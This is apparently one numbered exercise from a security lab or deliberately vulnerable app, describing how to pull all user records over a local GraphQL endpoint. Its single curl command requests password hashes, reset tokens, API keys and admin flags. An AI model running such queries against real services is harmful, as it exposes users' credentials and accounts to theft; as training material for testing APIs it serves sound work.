## 11 - User data exfiltration via GraphQL

### Goal
Query the full user list including sensitive fields.

### Endpoint
- `POST http://127.0.0.1:4000/api/graphql`

### Example

```bash
curl -s http://127.0.0.1:4000/api/graphql \
  -H "Content-Type: application/json" \
  -d "{\"query\":\"query{ users { id username email passwordHash passwordResetToken apiKey isAdmin } }\"}"
```

